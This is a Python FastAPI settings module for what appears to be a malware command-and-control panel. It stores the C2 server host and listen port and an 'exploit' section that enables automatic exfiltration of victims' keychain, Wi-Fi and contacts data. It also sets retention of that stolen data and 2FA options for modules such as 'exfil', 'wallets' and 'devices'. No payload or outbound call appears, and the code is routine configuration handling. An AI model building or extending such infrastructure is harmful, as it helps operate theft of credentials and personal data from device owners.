from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from pydantic import BaseModel
from datetime import datetime
from typing import Optional, List

from ..database import get_db, Settings, User
from ..auth import get_current_user
from ..utils.totp import verify_totp
from ..config_constants import cfg_int, cfg_str, default_of, all_setting_keys, parse_hhmm

router = APIRouter(prefix="/api/settings", tags=["settings"], redirect_slashes=False)

ALL_2FA_MODULES = [
    "users", "templates", "channels", "devices", "commands", "profile",
    "agents", "exfil", "audit", "logs", "notifications", "wallets",
]


def _get_setting(db: Session, key: str, default: str = "") -> str:
    item = db.query(Settings).filter(Settings.key == key).first()
    return item.value if item else default


def _set_setting(db: Session, key: str, value: str, description: Optional[str] = None, updated_by: str = None):
    item = db.query(Settings).filter(Settings.key == key).first()
    if item:
        item.value = value
        item.updated_by = updated_by
    else:
        item = Settings(key=key, value=value, description=description, updated_by=updated_by)
        db.add(item)
    db.commit()


def verify_settings_2fa(db: Session, user: User, otp_code: str):
    require_2fa = _get_setting(db, "security.require_2fa", "false").lower() == "true"
    if not require_2fa:
        return
    if require_2fa and not (user.google_2fa_enabled == 1 and user.google_2fa_secret):
        raise HTTPException(
            status_code=403,
            detail="系统已强制开启 2FA，当前用户未绑定 2FA，禁止修改系统设置"
        )
    if user.google_2fa_enabled == 1 and user.google_2fa_secret:
        if not otp_code or not verify_totp(user.google_2fa_secret, otp_code):
            raise HTTPException(status_code=400, detail="Invalid or missing 2FA code")


def require_module_2fa(db: Session, user: User, module: str, otp_code: str):
    require_2fa = _get_setting(db, "security.require_2fa", "false").lower() == "true"
    if not require_2fa:
        return
    enabled = _get_setting(db, f"security.twofa_{module}", "false").lower() == "true"
    if not enabled:
        return
    if not (user.google_2fa_enabled == 1 and user.google_2fa_secret):
        raise HTTPException(
            status_code=403,
            detail=f"模块 [{module}] 已开启 2FA 保护，当前用户未绑定 2FA，禁止操作"
        )
    if not otp_code or not verify_totp(user.google_2fa_secret, otp_code):
        raise HTTPException(status_code=400, detail="Invalid or missing 2FA code")


class BasicSettings(BaseModel):
    cors_origins: List[str] = []
    rate_anon: int = 60
    rate_auth: int = 600
    rate_login: int = 10
    default_redirect: str = ''
    token_expire: int = 1440
    watermark_enabled: bool = False
    watermark_color: str = '#409eff'
    watermark_opacity: float = 0.15


class C2Settings(BaseModel):
    c2_host: str = ''
    listen_host: str = '0.0.0.0'
    listen_port: int = 7070
    redirect_url: str = ''


class ExploitSettings(BaseModel):
    auto_exfil: bool = True
    exfil_categories: list = ['keychain', 'wifi', 'contacts']
    poll_interval: int = 30


class RetentionSettings(BaseModel):
    log_days: int = 30
    audit_days: int = 90
    exfil_days: int = 365
    fs_log_days: int = 30
    archive_batch_rows: int = 5000
    delete_chunk_rows: int = 500
    exfil_delete_chunk_rows: int = 1000
    backup_keep_days: int = 14


class CronSettings(BaseModel):
    rotate_start_hhmm: str = "03:30"
    rotate_window_minutes: int = 10
    rotate_tick_seconds: int = 60
    cmd_timeout_minutes: int = 30
    cmd_timeout_tick_seconds: int = 300


class AuthTuneSettings(BaseModel):
    otp_pending_ttl_sec: int = 300
    setup_token_ttl_sec: int = 600
    channel_ts_skew_sec: int = 300
    active_device_minutes: int = 30
    dashboard_max_days: int = 90


class LimitsSettings(BaseModel):
    auth_login_per_min: int = 5
    auth_2fa_per_min: int = 30
    auth_send_otp_per_min: int = 3
    cmd_send_per_min: int = 180
    cmd_bulk_per_min: int = 10
    tfa_setup_per_min: int = 10
    tfa_verify_test_per_min: int = 5


class FrontendRouteSettings(BaseModel):
    route_login: str = "/login"
    route_dashboard: str = "/dashboard"


class DeviceSideSettings(BaseModel):
    cookie_max_age_sec: int = 2592000
    log_tail_lines: int = 500
    sanitize_path_max: int = 500
    exfil_desc_max: int = 500
    page_default_limit: int = 100
    page_max_limit: int = 500


class SecuritySettings(BaseModel):
    require_2fa: bool = False
    session_timeout_minutes: int = 60
    force_2fa_users: bool = False
    force_2fa_agents: bool = False
    twofa_lock_after_attempts: int = 5
    twofa_lock_minutes: int = 15
    twofa_users: bool = False
    twofa_templates: bool = False
    twofa_channels: bool = False
    twofa_devices: bool = False
    twofa_commands: bool = False
    twofa_profile: bool = False
    twofa_agents: bool = False
    twofa_exfil: bool = False
    twofa_audit: bool = False
    twofa_logs: bool = False
    twofa_notifications: bool = False
    twofa_wallets: bool = False


class WatermarkSettings(BaseModel):
    enabled: bool = False
    text: str = ""
    color: str = "#409eff"
    font_size: int = 12
    opacity: float = 0.15
    rotation: int = -15


class AggregateSettings(BaseModel):
    basic: Optional[BasicSettings] = None
    c2: Optional[C2Settings] = None
    exploit: Optional[ExploitSettings] = None
    retention: Optional[RetentionSettings] = None
    cron: Optional[CronSettings] = None
    auth: Optional[AuthTuneSettings] = None
    limits: Optional[LimitsSettings] = None
    frontend: Optional[FrontendRouteSettings] = None
    device: Optional[DeviceSideSettings] = None
    security: Optional[SecuritySettings] = None
    watermark: Optional[WatermarkSettings] = None


class SettingItem(BaseModel):
    key: str
    value: str
    description: Optional[str] = None


@router.get("")
async def get_settings(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    cors_raw = _get_setting(db, "basic.cors_origins", "")
    cors_origins = [o.strip() for o in cors_raw.split(",") if o.strip()] if cors_raw else []
    return {
        "basic": {
            "cors_origins": cors_origins,
            "rate_anon": int(_get_setting(db, "basic.rate_anon", "60")),
            "rate_auth": int(_get_setting(db, "basic.rate_auth", "600")),
            "rate_login": int(_get_setting(db, "basic.rate_login", "10")),
            "default_redirect": _get_setting(db, "basic.default_redirect", ""),
            "token_expire": int(_get_setting(db, "basic.token_expire", "1440")),
            "watermark_enabled": _get_setting(db, "watermark.enabled", "false").lower() == "true",
            "watermark_color": _get_setting(db, "watermark.color", "#409eff"),
            "watermark_opacity": float(_get_setting(db, "watermark.opacity", "0.15")),
        },
        "c2": {
            "c2_host": _get_setting(db, "c2.c2_host", ""),
            "listen_host": _get_setting(db, "c2.listen_host", "0.0.0.0"),
            "listen_port": int(_get_setting(db, "c2.listen_port", "7070")),
            "redirect_url": _get_setting(db, "c2.redirect_url", "")
        },
        "exploit": {
            "auto_exfil": _get_setting(db, "exploit.auto_exfil", "true").lower() == "true",
            "exfil_categories": [c.strip() for c in _get_setting(db, "exploit.exfil_categories", "keychain,wifi,contacts").split(",") if c.strip()],
            "poll_interval": int(_get_setting(db, "exploit.poll_interval", "30"))
        },
        "retention": {
            "log_days": cfg_int(db, "retention.log_days"),
            "audit_days": cfg_int(db, "retention.audit_days"),
            "exfil_days": cfg_int(db, "retention.exfil_days"),
            "fs_log_days": cfg_int(db, "retention.fs_log_days"),
            "archive_batch_rows": cfg_int(db, "retention.archive_batch_rows"),
            "delete_chunk_rows": cfg_int(db, "retention.delete_chunk_rows"),
            "exfil_delete_chunk_rows": cfg_int(db, "retention.exfil_delete_chunk_rows"),
            "backup_keep_days": cfg_int(db, "retention.backup_keep_days"),
        },
        "cron": {
            "rotate_start_hhmm": cfg_str(db, "cron.rotate_start_hhmm"),
            "rotate_window_minutes": cfg_int(db, "cron.rotate_window_minutes"),
            "rotate_tick_seconds": cfg_int(db, "cron.rotate_tick_seconds"),
            "cmd_timeout_minutes": cfg_int(db, "cron.cmd_timeout_minutes"),
            "cmd_timeout_tick_seconds": cfg_int(db, "cron.cmd_timeout_tick_seconds"),
        },
        "auth": {
            "otp_pending_ttl_sec": cfg_int(db, "auth.otp_pending_ttl_sec"),
            "setup_token_ttl_sec": cfg_int(db, "auth.setup_token_ttl_sec"),
            "channel_ts_skew_sec": cfg_int(db, "auth.channel_ts_skew_sec"),
            "active_device_minutes": cfg_int(db, "auth.active_device_minutes"),
            "dashboard_max_days": cfg_int(db, "auth.dashboard_max_days"),
        },
        "limits": {
            "auth_login_per_min": cfg_int(db, "limits.auth_login_per_min"),
            "auth_2fa_per_min": cfg_int(db, "limits.auth_2fa_per_min"),
            "auth_send_otp_per_min": cfg_int(db, "limits.auth_send_otp_per_min"),
            "cmd_send_per_min": cfg_int(db, "limits.cmd_send_per_min"),
            "cmd_bulk_per_min": cfg_int(db, "limits.cmd_bulk_per_min"),
            "tfa_setup_per_min": cfg_int(db, "limits.tfa_setup_per_min"),
            "tfa_verify_test_per_min": cfg_int(db, "limits.tfa_verify_test_per_min"),
        },
        "frontend": {
            "route_login": cfg_str(db, "fe.route_login"),
            "route_dashboard": cfg_str(db, "fe.route_dashboard"),
        },
        "device": {
            "cookie_max_age_sec": cfg_int(db, "device.cookie_max_age_sec"),
            "log_tail_lines": cfg_int(db, "device.log_tail_lines"),
            "sanitize_path_max": cfg_int(db, "device.sanitize_path_max"),
            "exfil_desc_max": cfg_int(db, "device.exfil_desc_max"),
            "page_default_limit": cfg_int(db, "page.default_limit"),
            "page_max_limit": cfg_int(db, "page.max_limit"),
        },
        "security": {
            "require_2fa": _get_setting(db, "security.require_2fa", "false").lower() == "true",
            "session_timeout_minutes": int(_get_setting(db, "security.session_timeout_minutes", "60")),
            "force_2fa_users": _get_setting(db, "security.force_2fa_users", "false").lower() == "true",
            "force_2fa_agents": _get_setting(db, "security.force_2fa_agents", "false").lower() == "true",
            "twofa_lock_after_attempts": int(_get_setting(db, "security.2fa_lock_after_attempts", "5")),
            "twofa_lock_minutes": int(_get_setting(db, "security.2fa_lock_minutes", "15")),
            "twofa_users": _get_setting(db, "security.twofa_users", "false").lower() == "true",
            "twofa_templates": _get_setting(db, "security.twofa_templates", "false").lower() == "true",
            "twofa_channels": _get_setting(db, "security.twofa_channels", "false").lower() == "true",
            "twofa_devices": _get_setting(db, "security.twofa_devices", "false").lower() == "true",
            "twofa_commands": _get_setting(db, "security.twofa_commands", "false").lower() == "true",
            "twofa_profile": _get_setting(db, "security.twofa_profile", "false").lower() == "true",
            "twofa_agents": _get_setting(db, "security.twofa_agents", "false").lower() == "true",
            "twofa_exfil": _get_setting(db, "security.twofa_exfil", "false").lower() == "true",
            "twofa_audit": _get_setting(db, "security.twofa_audit", "false").lower() == "true",
            "twofa_logs": _get_setting(db, "security.twofa_logs", "false").lower() == "true",
            "twofa_notifications": _get_setting(db, "security.twofa_notifications", "false").lower() == "true",
            "twofa_wallets": _get_setting(db, "security.twofa_wallets", "false").lower() == "true",
        },
        "watermark": {
            "enabled": _get_setting(db, "watermark.enabled", "false").lower() == "true",
            "text": _get_setting(db, "watermark.text", ""),
            "color": _get_setting(db, "watermark.color", "#409eff"),
            "font_size": int(_get_setting(db, "watermark.font_size", "12")),
            "opacity": float(_get_setting(db, "watermark.opacity", "0.15")),
            "rotation": int(_get_setting(db, "watermark.rotation", "-15"))
        },
        "_keys_in_db": all_setting_keys(),
    }


@router.put("/c2")
async def update_c2_settings(
    settings: C2Settings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    _set_setting(db, "c2.c2_host", settings.c2_host, "C2服务器地址", username)
    _set_setting(db, "c2.listen_host", settings.listen_host, "监听地址", username)
    _set_setting(db, "c2.listen_port", str(settings.listen_port), "监听端口", username)
    _set_setting(db, "c2.redirect_url", settings.redirect_url, "重定向URL", username)
    return {"message": "C2 settings updated"}


@router.put("/exploit")
async def update_exploit_settings(
    settings: ExploitSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    _set_setting(db, "exploit.auto_exfil", "true" if settings.auto_exfil else "false", "自动Exfil", username)
    _set_setting(db, "exploit.exfil_categories", ",".join(settings.exfil_categories), "Exfil分类", username)
    _set_setting(db, "exploit.poll_interval", str(settings.poll_interval), "轮询间隔秒", username)
    return {"message": "Exploit settings updated"}


@router.put("/security")
async def update_security_settings(
    settings: SecuritySettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    _set_setting(db, "security.require_2fa", "true" if settings.require_2fa else "false", "强制2FA", username)
    _set_setting(db, "security.session_timeout_minutes", str(settings.session_timeout_minutes), "会话超时分钟", username)
    _set_setting(db, "security.force_2fa_users", "true" if settings.force_2fa_users else "false", "强制用户2FA绑定", username)
    _set_setting(db, "security.force_2fa_agents", "true" if settings.force_2fa_agents else "false", "强制代理商2FA绑定", username)
    _set_setting(db, "security.2fa_lock_after_attempts", str(settings.twofa_lock_after_attempts), "2FA失败冻结阈值次数", username)
    _set_setting(db, "security.2fa_lock_minutes", str(settings.twofa_lock_minutes), "2FA失败冻结分钟数", username)
    for mod in ALL_2FA_MODULES:
        val = getattr(settings, f"twofa_{mod}", False)
        _set_setting(db, f"security.twofa_{mod}", "true" if val else "false", f"{mod}模块2FA", username)
    return {"message": "Security settings updated"}


@router.put("/retention")
async def update_retention_settings(
    settings: RetentionSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    u = current_user.username if current_user else None
    _set_setting(db, "retention.log_days", str(settings.log_days), u)
    _set_setting(db, "retention.audit_days", str(settings.audit_days), u)
    _set_setting(db, "retention.exfil_days", str(settings.exfil_days), u)
    _set_setting(db, "retention.fs_log_days", str(settings.fs_log_days), u)
    _set_setting(db, "retention.archive_batch_rows", str(settings.archive_batch_rows), u)
    _set_setting(db, "retention.delete_chunk_rows", str(settings.delete_chunk_rows), u)
    _set_setting(db, "retention.exfil_delete_chunk_rows", str(settings.exfil_delete_chunk_rows), u)
    _set_setting(db, "retention.backup_keep_days", str(settings.backup_keep_days), u)
    return {"message": "Retention settings updated"}


@router.put("/cron")
async def update_cron_settings(
    settings: CronSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    try:
        parse_hhmm(settings.rotate_start_hhmm)
    except ValueError:
        raise HTTPException(status_code=400, detail="cron.rotate_start_hhmm must be 'HH:mm' (e.g. 03:30)")
    u = current_user.username if current_user else None
    _set_setting(db, "cron.rotate_start_hhmm", settings.rotate_start_hhmm, u)
    _set_setting(db, "cron.rotate_window_minutes", str(settings.rotate_window_minutes), u)
    _set_setting(db, "cron.rotate_tick_seconds", str(settings.rotate_tick_seconds), u)
    _set_setting(db, "cron.cmd_timeout_minutes", str(settings.cmd_timeout_minutes), u)
    _set_setting(db, "cron.cmd_timeout_tick_seconds", str(settings.cmd_timeout_tick_seconds), u)
    return {"message": "Cron settings updated"}


@router.put("/auth-tune")
async def update_auth_tune_settings(
    settings: AuthTuneSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    u = current_user.username if current_user else None
    _set_setting(db, "auth.otp_pending_ttl_sec", str(settings.otp_pending_ttl_sec), u)
    _set_setting(db, "auth.setup_token_ttl_sec", str(settings.setup_token_ttl_sec), u)
    _set_setting(db, "auth.channel_ts_skew_sec", str(settings.channel_ts_skew_sec), u)
    _set_setting(db, "auth.active_device_minutes", str(settings.active_device_minutes), u)
    _set_setting(db, "auth.dashboard_max_days", str(settings.dashboard_max_days), u)
    return {"message": "Auth tune settings updated"}


@router.put("/limits")
async def update_limits_settings(
    settings: LimitsSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    u = current_user.username if current_user else None
    for field, key in [
        ("auth_login_per_min", "limits.auth_login_per_min"),
        ("auth_2fa_per_min", "limits.auth_2fa_per_min"),
        ("auth_send_otp_per_min", "limits.auth_send_otp_per_min"),
        ("cmd_send_per_min", "limits.cmd_send_per_min"),
        ("cmd_bulk_per_min", "limits.cmd_bulk_per_min"),
        ("tfa_setup_per_min", "limits.tfa_setup_per_min"),
        ("tfa_verify_test_per_min", "limits.tfa_verify_test_per_min"),
    ]:
        _set_setting(db, key, str(int(getattr(settings, field))), u)
    return {"message": "Limits settings updated (next restart or decorator reload will pick them up via env)"}


@router.put("/frontend")
async def update_frontend_settings(
    settings: FrontendRouteSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    u = current_user.username if current_user else None
    if not settings.route_login.startswith("/") or not settings.route_dashboard.startswith("/"):
        raise HTTPException(status_code=400, detail="FE routes must start with '/'")
    _set_setting(db, "fe.route_login", settings.route_login, u)
    _set_setting(db, "fe.route_dashboard", settings.route_dashboard, u)
    return {"message": "Frontend route defaults updated"}


@router.put("/device")
async def update_device_side_settings(
    settings: DeviceSideSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    u = current_user.username if current_user else None
    _set_setting(db, "device.cookie_max_age_sec", str(settings.cookie_max_age_sec), u)
    _set_setting(db, "device.log_tail_lines", str(settings.log_tail_lines), u)
    _set_setting(db, "device.sanitize_path_max", str(settings.sanitize_path_max), u)
    _set_setting(db, "device.exfil_desc_max", str(settings.exfil_desc_max), u)
    _set_setting(db, "page.default_limit", str(settings.page_default_limit), u)
    _set_setting(db, "page.max_limit", str(settings.page_max_limit), u)
    return {"message": "Device-side / pagination defaults updated"}


@router.put("/watermark")
async def update_watermark_settings(
    settings: WatermarkSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    _set_setting(db, "watermark.enabled", "true" if settings.enabled else "false", "水印启用", username)
    _set_setting(db, "watermark.text", settings.text, "水印文字", username)
    _set_setting(db, "watermark.color", settings.color, "水印颜色", username)
    _set_setting(db, "watermark.font_size", str(settings.font_size), "水印字号", username)
    _set_setting(db, "watermark.opacity", str(settings.opacity), "水印透明度", username)
    _set_setting(db, "watermark.rotation", str(settings.rotation), "水印旋转", username)
    return {"message": "Watermark settings updated"}


@router.put("/basic")
async def update_basic_settings(
    settings: BasicSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    _set_setting(db, "basic.cors_origins", ",".join(settings.cors_origins), "CORS允许来源", username)
    _set_setting(db, "basic.rate_anon", str(settings.rate_anon), "未登录限流每分钟", username)
    _set_setting(db, "basic.rate_auth", str(settings.rate_auth), "登录限流每分钟", username)
    _set_setting(db, "basic.rate_login", str(settings.rate_login), "登录失败限流每分钟", username)
    _set_setting(db, "basic.default_redirect", settings.default_redirect, "默认重定向URL", username)
    _set_setting(db, "basic.token_expire", str(settings.token_expire), "Token有效期分钟", username)
    _set_setting(db, "watermark.enabled", "true" if settings.watermark_enabled else "false", "水印启用", username)
    _set_setting(db, "watermark.color", settings.watermark_color, "水印颜色", username)
    _set_setting(db, "watermark.opacity", str(settings.watermark_opacity), "水印透明度", username)
    return {"message": "Basic settings updated"}


@router.put("")
async def update_aggregate_settings(
    payload: AggregateSettings,
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    if payload.basic is not None:
        s = payload.basic
        _set_setting(db, "basic.cors_origins", ",".join(s.cors_origins), "CORS允许来源", username)
        _set_setting(db, "basic.rate_anon", str(s.rate_anon), "未登录限流每分钟", username)
        _set_setting(db, "basic.rate_auth", str(s.rate_auth), "登录限流每分钟", username)
        _set_setting(db, "basic.rate_login", str(s.rate_login), "登录失败限流每分钟", username)
        _set_setting(db, "basic.default_redirect", s.default_redirect, "默认重定向URL", username)
        _set_setting(db, "basic.token_expire", str(s.token_expire), "Token有效期分钟", username)
        _set_setting(db, "watermark.enabled", "true" if s.watermark_enabled else "false", "水印启用", username)
        _set_setting(db, "watermark.color", s.watermark_color, "水印颜色", username)
        _set_setting(db, "watermark.opacity", str(s.watermark_opacity), "水印透明度", username)
    if payload.c2 is not None:
        s = payload.c2
        _set_setting(db, "c2.c2_host", s.c2_host, "C2服务器地址", username)
        _set_setting(db, "c2.listen_host", s.listen_host, "监听地址", username)
        _set_setting(db, "c2.listen_port", str(s.listen_port), "监听端口", username)
        _set_setting(db, "c2.redirect_url", s.redirect_url, "重定向URL", username)
    if payload.exploit is not None:
        s = payload.exploit
        _set_setting(db, "exploit.auto_exfil", "true" if s.auto_exfil else "false", "自动Exfil", username)
        _set_setting(db, "exploit.exfil_categories", ",".join(s.exfil_categories), "Exfil分类", username)
        _set_setting(db, "exploit.poll_interval", str(s.poll_interval), "轮询间隔秒", username)
    if payload.retention is not None:
        s = payload.retention
        for field, key in [
            ("log_days", "retention.log_days"), ("audit_days", "retention.audit_days"),
            ("exfil_days", "retention.exfil_days"), ("fs_log_days", "retention.fs_log_days"),
            ("archive_batch_rows", "retention.archive_batch_rows"),
            ("delete_chunk_rows", "retention.delete_chunk_rows"),
            ("exfil_delete_chunk_rows", "retention.exfil_delete_chunk_rows"),
            ("backup_keep_days", "retention.backup_keep_days"),
        ]:
            _set_setting(db, key, str(int(getattr(s, field))), username)
    if payload.cron is not None:
        s = payload.cron
        try:
            parse_hhmm(s.rotate_start_hhmm)
        except ValueError:
            raise HTTPException(status_code=400, detail="cron.rotate_start_hhmm must be 'HH:mm'")
        _set_setting(db, "cron.rotate_start_hhmm", s.rotate_start_hhmm, username)
        _set_setting(db, "cron.rotate_window_minutes", str(s.rotate_window_minutes), username)
        _set_setting(db, "cron.rotate_tick_seconds", str(s.rotate_tick_seconds), username)
        _set_setting(db, "cron.cmd_timeout_minutes", str(s.cmd_timeout_minutes), username)
        _set_setting(db, "cron.cmd_timeout_tick_seconds", str(s.cmd_timeout_tick_seconds), username)
    if payload.auth is not None:
        s = payload.auth
        for field, key in [
            ("otp_pending_ttl_sec", "auth.otp_pending_ttl_sec"),
            ("setup_token_ttl_sec", "auth.setup_token_ttl_sec"),
            ("channel_ts_skew_sec", "auth.channel_ts_skew_sec"),
            ("active_device_minutes", "auth.active_device_minutes"),
            ("dashboard_max_days", "auth.dashboard_max_days"),
        ]:
            _set_setting(db, key, str(int(getattr(s, field))), username)
    if payload.limits is not None:
        s = payload.limits
        for field, key in [
            ("auth_login_per_min", "limits.auth_login_per_min"),
            ("auth_2fa_per_min", "limits.auth_2fa_per_min"),
            ("auth_send_otp_per_min", "limits.auth_send_otp_per_min"),
            ("cmd_send_per_min", "limits.cmd_send_per_min"),
            ("cmd_bulk_per_min", "limits.cmd_bulk_per_min"),
            ("tfa_setup_per_min", "limits.tfa_setup_per_min"),
            ("tfa_verify_test_per_min", "limits.tfa_verify_test_per_min"),
        ]:
            _set_setting(db, key, str(int(getattr(s, field))), username)
    if payload.frontend is not None:
        s = payload.frontend
        if not s.route_login.startswith("/") or not s.route_dashboard.startswith("/"):
            raise HTTPException(status_code=400, detail="FE routes must start with '/'")
        _set_setting(db, "fe.route_login", s.route_login, username)
        _set_setting(db, "fe.route_dashboard", s.route_dashboard, username)
    if payload.device is not None:
        s = payload.device
        for field, key in [
            ("cookie_max_age_sec", "device.cookie_max_age_sec"),
            ("log_tail_lines", "device.log_tail_lines"),
            ("sanitize_path_max", "device.sanitize_path_max"),
            ("exfil_desc_max", "device.exfil_desc_max"),
            ("page_default_limit", "page.default_limit"),
            ("page_max_limit", "page.max_limit"),
        ]:
            _set_setting(db, key, str(int(getattr(s, field))), username)
    if payload.security is not None:
        s = payload.security
        _set_setting(db, "security.require_2fa", "true" if s.require_2fa else "false", "强制2FA", username)
        _set_setting(db, "security.session_timeout_minutes", str(s.session_timeout_minutes), "会话超时分钟", username)
        _set_setting(db, "security.force_2fa_users", "true" if s.force_2fa_users else "false", "强制用户2FA绑定", username)
        _set_setting(db, "security.force_2fa_agents", "true" if s.force_2fa_agents else "false", "强制代理商2FA绑定", username)
        _set_setting(db, "security.2fa_lock_after_attempts", str(s.twofa_lock_after_attempts), "2FA失败冻结阈值次数", username)
        _set_setting(db, "security.2fa_lock_minutes", str(s.twofa_lock_minutes), "2FA失败冻结分钟数", username)
        for mod in ALL_2FA_MODULES:
            val = getattr(s, f"twofa_{mod}", False)
            _set_setting(db, f"security.twofa_{mod}", "true" if val else "false", f"{mod}模块2FA", username)
    if payload.watermark is not None:
        s = payload.watermark
        _set_setting(db, "watermark.enabled", "true" if s.enabled else "false", "水印启用", username)
        _set_setting(db, "watermark.text", s.text, "水印文字", username)
        _set_setting(db, "watermark.color", s.color, "水印颜色", username)
        _set_setting(db, "watermark.font_size", str(s.font_size), "水印字号", username)
        _set_setting(db, "watermark.opacity", str(s.opacity), "水印透明度", username)
        _set_setting(db, "watermark.rotation", str(s.rotation), "水印旋转", username)
    return {"message": "Settings updated"}


@router.get("/all")
async def list_all_settings(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    rows = db.query(Settings).order_by(Settings.key).all()
    return [{"key": r.key, "value": r.value, "description": r.description, "updated_by": r.updated_by, "updated_at": r.updated_at.isoformat() if r.updated_at else None} for r in rows]


@router.put("/bulk")
async def bulk_update_settings(
    items: List[SettingItem],
    otp_code: str = "",
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    verify_settings_2fa(db, current_user, otp_code)
    username = current_user.username if current_user else None
    for it in items:
        _set_setting(db, it.key, it.value, it.description, username)
    return {"message": f"Updated {len(items)} settings"}
